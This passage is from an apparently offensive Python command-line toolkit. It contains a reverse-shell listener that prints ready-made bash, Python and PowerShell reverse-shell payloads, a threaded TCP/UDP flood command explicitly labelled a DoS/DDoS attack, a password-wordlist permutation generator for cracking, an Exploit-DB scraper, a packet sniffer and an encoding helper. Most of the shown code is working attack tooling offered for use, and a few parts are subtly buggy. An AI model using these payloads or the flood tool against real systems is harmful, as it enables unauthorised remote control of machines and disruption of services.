    try:
        conn, addr = server_socket.accept()
        click.echo(click.style(f"[+] Connection received from {addr}", fg="green"))
        if type == "bash":
            click.echo(click.style(f"[!] Payload to execute on target:\nbash -i >& /dev/tcp/{host}/{port} 0>&1", fg="yellow"))
        elif type == "python":
            click.echo(click.style(f"[!] Payload to execute on target:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", fg="yellow"))
        elif type == "powershell":
            if arch == "x64":
                click.echo(click.style(f"[!] Payload to execute on target:\n$client = New-Object System.Net.Sockets.TCPClient(\"{host}\", {port});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", fg="yellow"))
            else:
                click.echo(click.style(f"[!] Payload to execute on target:\n", fg="yellow"))
        
        while True:
            command = input(f"{addr}> ")
            if command.lower() in ("exit", "quit"):
                conn.send(b"exit\n")
                click.echo(click.style(f"[!] Connection terminated.", fg="magenta"))
                break
            conn.send(command.encode() + b"\n")
            response = conn.recv(4096)
            click.echo(click.style(response.decode()))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))
    finally:
        conn.close()
        server_socket.close()
        click.echo(click.style(f"[!] Listener terminated.", fg="magenta"))

#NETSTR COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="Target IP or hostname.")
@click.option("-p", "--port", default=443, type=int, help="Target port. Default = 443")
@click.option("-c", "--count", default=1000, type=int, help="Number of requests/packets to send. Default = 1000")
@click.option("-t", "--threads", default=10, type=int, help="Number of concurrent threads. Default = 10")
@click.option("-d", "--delay", default=0.0, type=float, help="Delay between requests/packets in seconds. Default = 0.0")
@click.option("-u", "--udp", is_flag=True, help="Perform a UDP attack instead of TCP.")
@click.option("-f", "--file", type=click.Path(exists=True), help="Path to payload file.")
def netstr(host, port, count, threads, delay, udp, file):
    if file:
        with open(file, "rb") as f:
            payload = f.read()
        click.echo(click.style(f"[!] Successfully loaded payload from {file}.", fg="green"))
    else:
        payload = b"A * 1024" #Default dummy payload
        click.echo(click.style(f"[!] Using default payload", fg="green"))

    click.echo(click.style(f"[*] Performing {'UDP' if udp else 'TCP'} DoS/DDoS attack on {host}:{port} ...", fg="blue"))
    def send():
        for _ in range(count // threads):
            try:
                if udp:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(payload, (host, port))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    #sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    sock.send(payload)
                sock.close()
                time.sleep(delay)
            except Exception as e:
                click.echo(click.style(f"[!] Error: {e}", fg="red"))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send) for _ in range(threads)]
        for future in concurrent.futures.as_completed(futures):
            if future.exception():
                click.echo(click.style(f"[!] Thread error: {future.exception()}", fg="red"))
    
    click.echo(click.style(f"DoS/DDoS attack completed.", fg="green"))

#ENCHECK COMMAND
@cli.command()
@click.option("-s", "--service", type=click.Choice(["http", "ftp", "imap", "pop3", "smtp"], case_sensitive=False), help="Service to analyze.")
@click.option("-h", "--host", required=True, help="IP or host of the target service.")
@click.option("-p", "--port", type=int, help="Port of the target service.")
def encheck(service, host, port):
    click.echo(click.style(f"[*] Starting encryption analysis for {service.upper()} on {host}:{port} ...", fg="blue"))
    try:
        if service.lower() == "http":
            port = port or 80
            try:
                response = requests.get(f"http://{host}:{port}", timeout=5)
                click.echo(click.style(f"[!] HTTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
            except requests.exceptions.SSLError:
                click.echo(click.style(f"[!] HTTPS service detected on {host}:{port}. Secure protocol.", fg="yellow"))
        elif service.lower() == "ftp":
            port = port or 21
            with ftplib.FTP() as ftp:
                ftp.connect(host, port, timeout=5)
                click.echo(click.style(f"[!] FTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
        elif service.lower() in ["imap", "pop3", "smtp"]:
            port = port or {"imap": 143, "pop3": 110, "smtp": 25}[service.lower()]
            secure_ports = {"imap": 993, "pop3": 995, "smtp": 465}[service.lower()]
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as secure_sock:
                        click.echo(click.style(f"[!] {service.upper()} on {host}:{port} supports TLS/SSL. Secure protocol.", fg="yellow"))
            except ssl.SSLError:
                click.echo(click.style(f"[!] {service.upper()} on {host}:{port} does not support TLS/SSL. Insecure protocol.", fg="green"))
            except Exception as e:
                click.echo(click.style(f"[!] Error analyzing {service.upper()} on {host}:{port}. {e}", fg="red"))
        else:
            click.echo(click.style(f"[!] Unsupported service: {service}", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#EXPLOIT COMMAND
@cli.command()
@click.option("-q", "--query", required=True, help="Search query (Name, CVE or Version).")
@click.option("-o", "--output", type=click.Path(), help="Path to save the results.")
def exploit(query, output):
    click.echo(click.style(f"[*] Searching for exploits related to: {query} ...", fg="blue"))
    try:
        url = f"https://www.exploit-db.com/search?q={query}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/130.0.0.0"
        }
        response = requests.get(url, headers=headers) #headers = headers
        if response.status_code != 200:
            click.echo(click.style(f"[!] Failed to fetch exploit data.", fg="red"))
            return
        
        bs = BeautifulSoup(response.text, "html.parser")
        results = []
        for row in bs.select("exploits-table_info"): #table.table-results tbody tr
            cols = row.find_all("td")
            if len(cols) > 2 and cols[1].find("a"):
                exploit_title = cols[1].text.strip()
                exploit_date = cols[2].text.strip()
                exploit_link = "https://www.exploit-db.com" + cols[1].find("a")["href"]
                results.append((exploit_title, exploit_date, exploit_link))
            #else:
            #    continue
        
        if not results:
            click.echo(click.style(f"[!] No exploits found for the provided query.", fg="magenta"))
            return
        click.echo(click.style(f"[!] Found exploits:", fg="green"))
        for id, (title, date, link) in enumerate(results, 1):
            click.echo(click.style(f"[{id}] {title} ({date}) - {link}", fg="yellow"))
        
        if output:
            with open("Electra-Exploit-Search.txt", "a") as file:
                for title, date, link in results:
                    file.write(f"{title} ({date}) - {link}\n")
            click.echo(click.style(f"[!] Successfully saved results to {output}", fg="green"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error connecting to ExploitDB: {e}", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#PASSPERM COMMAND
@cli.command()
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
@click.option("-o", "--output", default="Electra-Perm-Passwords.txt", help="Output file to save permutated passwords.")
@click.option("-m", "--mode", type=click.Choice(["numbers", "special", "both", "chars", "all"], case_sensitive=False), required=True, help="Permutation mode. both = numbers & special characters. all = numbers, special characters & characters.")
@click.option("-l", "--length", default=1, help="Length of permutations. (Default = 1)")
def passperm(wordlist, output, mode, length):
    click.echo(click.style("[*] Starting password permutation ...", fg="blue"))
    numbers = "0123456789"
    special_chars = "!@#$%^&*()-_=+[]{};:',.<>?/|\\"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    charset = ""

    if mode == "numbers":
        charset = numbers
    elif mode == "special":
        charset = special_chars
    elif mode == "both":
        charset = numbers + special_chars
    elif mode == "chars":
        charset = chars
    elif mode == "all":
        charset = numbers + special_chars + chars
    
    try:
        with open(wordlist, "r") as infile, open(output, "a") as outfile:
            passwords = [line.strip() for line in infile]
            click.echo(click.style(f"[~] Loaded {len(passwords)} passwords from the wordlist.", fg="yellow"))
            #Generate permutations
            for password in passwords:
                new_passwords = set()
                for combination in itertools.product(charset, repeat=length):
                    comb = "".join(combination)
                    
                    #Create combinations
                    new_passwords.add(password + comb)
                    new_passwords.add(comb + password)

                    #Replace characters within the password
                    for i in range(len(password)):
                        replace = (password[:i] + comb[0] + password[i + 1:])
                        #Replace one character
                        new_passwords.add(replace)
                
                for new_password in new_passwords:
                    outfile.write(new_password + "\n")
        click.echo(click.style(f"[!] Password permutations successfully saved to {output}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#NANAL COMMAND
@cli.command()
@click.option("-p", "--period", type=int, help="Duration in seconds to capture packets.")
@click.option("-f", "--file", type=click.Path(exists=True), help="Path to an existing pcap file for analysis.")
def nanal(period, file):
    if not period and not file:
        click.echo(click.style("[!] Specify a period for capture (-p) or provide an existing file (-f).", fg="magenta"))
        return
    
    if period:
        click.echo(click.style(f"[*] Starting packet capture for {period} seconds ...", fg="blue"))
        try:
            packets = sniff(timeout=period)
            output_file = f"Electra-Capture-{int(time.time())}.pcap"
            wrpcap(output_file, packets)
            click.echo(click.style(f"[!] Capture completed. File saved to {output_file}", fg="green"))
            pkt_anal(output_file)
        except Exception as e:
            click.echo(click.style(f"[!] Error during packet capture: {e}", fg="red"))
    
    if file:
        click.echo(click.style(f"[*] Analyzing packets in file: {file} ...", fg="blue"))
        pkt_anal(file)

def pkt_anal(file):
    try:
        capture = pyshark.FileCapture(file)
        unusual_packets = []
        click.echo(click.style(f"[*] Scanning packets in {file} for anomalies ...", fg="blue"))
        for packet in capture:
            try:
                if "ICMP" in packet and hasattr(packet.icmp, "type") and packet.icmp.type == "8":
                    unusual_packets.append(f"ICMP Echo Request from {packet.ip.src} to {packet.ip.dst}")
                if "TCP" in packet and hasattr(packet.tcp, "flags") and int(packet.tcp.flags, 16) == 0x3F:
                    unusual_packets.append(f"SYN-FIN-PSH-URG flags set in TCP packet from {packet.ip.src} to {packet.ip.dst}")
                if "DNS" in packet and packet.dns.qry_name.endswith("."):
                    unusual_packets.append(f"DNS query for suspicious domain: {packet.dns.qry_name}")
            except AttributeError:
                continue
        
        if unusual_packets:
            click.echo(click.style(f"[!] Detected unusual activity:", fg="yellow"))
            for pkt in unusual_packets:
                click.echo(click.style(f"{pkt}", fg="yellow"))
        else:
            click.echo(click.style(f"[!] No unusual activity detected.", fg="green"))
        capture.close()
    
    except Exception as e:
        click.echo(click.style(f"[!] Error analyzing pcap file. {e}", fg="red"))

#CODEC COMMAND
@cli.command()
@click.option("-e", "--encode", is_flag=True, help="Encode the input.")
@click.option("-d", "--decode", is_flag=True, help="Decode the input.")
@click.option("-f", "--format", required=True, type=click.Choice(["base64", "url", "binary", "decimal", "octal", "hex"], case_sensitive=False), help="Specify the format (base64, url, etc).")
@click.option("-i", "--input", required=True, help="Input string to encode or decode.")
def codec(encode, decode, format, input):
    if encode and decode:
        click.echo(click.style("[!] Error: Please choose either encode or decode, not both.", fg="red"))
        return
    
    if not encode and not decode:
        click.echo(click.style("[!] Error: Please specify an option. Encode (-e) Decode (-d).", fg="red"))
        return
    
    try:
        if encode:
            if format == "base64":
                output = base64.b64encode(input.encode()).decode()
            elif format == "url":
                output = urllib.parse.quote(input)
            elif format == "binary":
                output = " ".join(format(ord(c), "08b") for c in input)
            elif format == "decimal":
                output = " ".join(str(ord(c)) for c in input)
            elif format == "octal":
                output = " ".join(format(ord(c), "o") for c in input)
            elif format == "hex":
                output = input.encode().hex()
            else:
                click.echo(click.style("[!] Invalid format specified.", fg="red"))
                return
            click.echo(click.style(f"[!] Encoded output: {output}", fg="green"))

        if decode:
            if format == "base64":
                output = base64.b64decode(input).decode()
            elif format == "url":
                output = urllib.parse.unquote(input)
            elif format == "binary":
                output = "".join(chr(int(b, 2)) for b in input.split())
            elif format == "decimal":
                output = "".join(chr(int(d)) for d in input.split())
            elif format == "octal":
                output = "".join(chr(int(o, 8)) for o in input.split())
            elif format == "hex":
                output = bytes.fromhex(input).decode()
            else:
                click.echo(click.style("[!] Invalid format specified.", fg="red"))
                return
            click.echo(click.style(f"[!] Decoded output: {output}", fg="green"))
    
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

if __name__ == "__main__":
    cli()